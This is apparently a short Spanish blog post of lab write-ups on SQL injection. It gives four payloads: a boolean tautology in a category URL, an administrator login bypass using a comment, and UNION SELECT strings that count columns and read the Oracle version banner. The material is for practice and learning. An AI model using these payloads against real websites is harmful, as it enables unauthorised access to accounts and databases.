---
typora-copy-images-to: ../assets/img
typora-root-url: ../
layout: post
categories:
conToc: true
title: Inyeccion SQL
---

# SQL Injection



## LAB 1

Buscamos una categoría y pegamos el siguiente codigo al lado de la URL

```bash
'+OR+1=1--
```

![image-20220510122452718](/assets/img/image-20220510122452718.png)



## LAB 2

Entramos en My Account y ponemos el siguiente usuario

```bash
administrator'--
```

![image-20220510123014402](/assets/img/image-20220510123014402.png)



## LAB 3

AL igual que en el primer lab entramos en una categoría, y añadimos:

```bash
'+UNION+SELECT+NULL,NULL,NULL--
```

![image-20220510123847144](/assets/img/image-20220510123847144.png)





## LAB 4

Parecido al 1 y 3, entramos en una categoría, y añadimos el siguiente código a la URL:

```php
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

![image-20220510124048343](/assets/img/image-20220510124048343.png)

